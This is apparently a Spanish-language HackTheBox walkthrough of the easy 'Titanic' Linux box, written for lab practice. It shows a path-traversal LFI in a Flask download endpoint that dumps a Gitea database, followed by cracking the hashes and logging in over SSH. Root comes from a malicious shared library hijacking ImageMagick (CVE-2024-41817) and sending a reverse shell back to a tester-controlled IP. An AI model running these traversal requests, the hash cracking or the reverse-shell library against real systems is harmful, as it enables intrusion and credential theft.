
Propiedades:
- OS: Linux 
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #gitea #lfi #path-traversal #path-hijacking #magick 


![](assets/Pasted%20image%2020251220231520.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad.

- ttl 63 indica maquina linux

```bash
> ping -c 1 10.129.11.182
PING 10.129.11.182 (10.129.11.182) 56(84) bytes of data.
64 bytes from 10.129.11.182: icmp_seq=1 ttl=63 time=91.4 ms

--- 10.129.11.182 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.429/91.429/91.429/0.000 ms
```

Ahora realizo un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.11.182
---------------------------------------------------------------
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo con nmap para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80 -Pn -n -sS -sV -sC -vvv 10.129.11.182 -oA nmap/target
--------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
- Puerto 80 HTTP Apache httpd 2.4.52 con dominio `titanic.htb`

Metemos el dominio al `/etc/hosts`

```bash
> sudo nano /etc/hosts

10.129.11.182 titanic.htb
```

## Enumeración

### Puerto 80 HTTP

Al parecer la pagina es para reservar un viaje en el titanic y morir en el intento.

![](assets/Pasted%20image%2020251220204707.png)

Al darle al boton de **Book Your Trip** nos promptea un formulario y nos descarga un archivo `.json` donde se ven reflejados nuestros datos.

![](assets/Pasted%20image%2020251220204758.png)

```bash
cat titanic.json | jq
{
  "name": "wndr",
  "email": "wndr@wndr.com",
  "phone": "11111111111",
  "date": "2002-03-03",
  "cabin": "Deluxe"
}
```

**Tecnologias Web.**

Wappalyzer detecta que la pagina corre con `Python` mas especifico con el framework `Flask`

![](assets/Pasted%20image%2020251220205010.png)

**Fuzzing de Directorios.**

Con ffuf descubro el directorio **/book**

```bash
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://titanic.htb/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 7399, Words: 2501, Lines: 156, Duration: 153ms]
book                    [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 121ms]
```

**Fuzzing de Subdominios.**

Utilizamos `ffuf` para descubrir posibles subdominios y nos encontramos con el subdominio `dev`

```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -ic -fl 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 10
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 96ms]
```

Metemos el subdomino al `/etc/hosts`

```bash
> sudo nano /etc/hosts
10.129.11.182 titanic.htb dev.titanic.htb
```

### Subdominio dev.titanic.htb

En este subdominio esta corriendo **Gitea.** 

- Gitea es un software para el control de versiones auto-alojado similar a GitHub y Gitlab.

![](assets/Pasted%20image%2020251220205914.png)

Podemos ver que se esta usando la version `1.22.1` de **Gitea**

![](assets/Pasted%20image%2020251220205935.png)


Me cree una cuenta en **Gitea** para ver que me encontraba:

![](assets/Pasted%20image%2020251220210536.png)

Me encontré 2 repositorios.

![](assets/Pasted%20image%2020251220210639.png)

**Repositorio docker-config.**

Aqui encontramos 2 `docker-compose`

- Docker compose de **Gitea** nos muestra la path de su instalación.

```yaml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

- Docker compose de `mysql` nos muestra la password de la base de datos.

```yaml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```


También encontramos 2 usuarios.

![](assets/Pasted%20image%2020251220210654.png)


## Explotación

Con burpsuite intercepta la petición de reservación:

![](assets/Pasted%20image%2020251220204758.png)


Podemos ver que nos trata de redirigir a `/download?ticket=`

![](assets/Pasted%20image%2020251220212254.png)

Al momento de la redireccion podemos ver que `ticket=` recibe como parametro un archivo.

![](assets/Pasted%20image%2020251220212316.png)

Lo primero que intente fue un LFI y funciono correctamente.

- el `/etc/passwd` me indico el usuario `developer`

![](assets/Pasted%20image%2020251220212410.png)

Ahora anteriormente descubrimos que el repositorio **docker-config** contenía un archivo **docker-compose.yml** donde nos mostraba donde estaba la ruta de instalación de Gitea.

- /home/developer/gitea/data 

```bash
> cat docker-compose.yml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
```

Con una búsqueda simple en internet doy con la ruta del archivo de configuración de **Gitea** 

```bash
/data/gitea/conf/app.ini
```

Por lo cual la petición quedaría asi:

```bash
GET /download?ticket=../../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini
```

![](assets/Pasted%20image%2020251220214140.png)

Obtenemos la informacion de la ruta de la `db`

```bash
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable
```

El endpoint quedaría algo asi:

```bash
GET ../../../../../../../../../home/developer/gitea/data/gitea/conf/app.in
```

Tire un CURL para dumpear el contenido de la base de datos y guardarlo en un archivo.

```bash
curl --path-as-is -s -k "http://titanic.htb/download?ticket=../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Inspeccionando el archivo me encuentro con credenciales para los usuarios administrador y developer.

![](assets/Pasted%20image%2020251220215026.png)

**Gitea** guarda las credenciales en varias columnas por lo cual voy a utilizar el siguiente script para convertir los hashes a formato hashcat crackeables: [gitea2hashcat](https://raw.githubusercontent.com/hashcat/hashcat/refs/heads/master/tools/gitea2hashcat.py)

```bash
> sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:vIAffTRXfStNdgePsn2RTA==:AV5AvGFan13E3wDWLQn7EgE2zKKaWhOtr0fGdAbZpkPU0QordpvtQ+6aGK57aP/nhS8=
sha256:50000:5AY++CVIwD5jxwm48c4H1Q==:0tuiCGkIiQ1AwGOvH8FjiGEqq5QAHPG9f2ShfgQ2ISeNinR+XVpyz/HSyyZvTmPngeQ=
```

Guardo las hashes en un archivo y crackeo los hashes con hashcat.

- password encontrada 25282528

```bash
> hashcat hashes /usr/share/wordlists/rockyou.txt
-------------------------------------------------
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

El script no me muestra a quien pertenece ese hash, pero se de antemano que existe un usuario `developer` por lo cual probé las siguientes credenciales para SSH:

- developer:25282528

```bash
> ssh developer@10.129.11.182
--------------------------------------------------------------------
developer@titanic:~$ id                                                                                                                                                      
uid=1000(developer) gid=1000(developer) groups=1000(developer)
developer@titanic:~$ 
```

Obtenemos la primera flag en el directorio home

```bash
> cat /home/developer/user.txt
653f01eb4247f********
```


## Escalada de Privilegios

Dentro del escritorio me topo con un script llamada `identify_images.sh`

- El script se mueve al directorio/opt/app/static/assets/images, limpia el archivo `metadata.log` y procede a buscar todos los archivo con extensión `.jpg` para pasárselos como argumento al binario `/usr/bin/magick`

```bash
developer@titanic:/opt/scripts$ ls
identify_images.sh
developer@titanic:/opt/scripts$ cat identify_images.sh

cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Podemos ver que el archivo `metadata.log` fue modificado hace 1 minuto por lo cual me hace pensar que el script es una cronjob ósea que se ejecuta regularmente.

```bash
-rw-r----- 1 root      developer      0 Dec 21 04:57 metadata.log
developer@titanic:/dev/shm$ date
Sun Dec 21 04:58:01 AM UTC 2025
```

Enumero la versiones de `magick`

-  7.1.1-35

```bash
developer@titanic:/opt/scripts$ /usr/bin/magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)

```

Esa version es vulnerable a una ejecución de comandos [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8):  

Al parecer `magick` utiliza una empty path para `LD_LIBRARY_PATH` lo cual nos permite a nosotros alterar la dependencia legitima `libxcb.so.1` para que se ejecute lo que querramos.

- Primero crearemos la rev-shell y la compilaremos con el nombre de la dependencia legitima.

```bash
developer@titanic:/dev/shm$ cat shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.15.110/443 0>&1'");
    exit(0);
}

developer@titanic:/dev/shm$ gcc -x c -shared -fPIC -o ./libxcb.so.1 shell.c
```

- Movemos el binario compilado al directorio donde se ejecuta `magick`: `/opt/app/static/assets/images/`

```bash
developer@titanic:/dev/shm$ cp libxcb.so.1 /opt/app/static/assets/images/
```

- Nos ponemos en escucha y recibimos la conexión.

```bash
> sudo nc -nlvp 443
Connection received on 10.129.11.182 43554
bash: cannot set terminal process group (141082): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images# cd /    
cd /
root@titanic:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@titanic:~# cat root.txt
cat root.txt
4db2aa9b218
```

***PWNED***

![](assets/Pasted%20image%2020251220231429.png)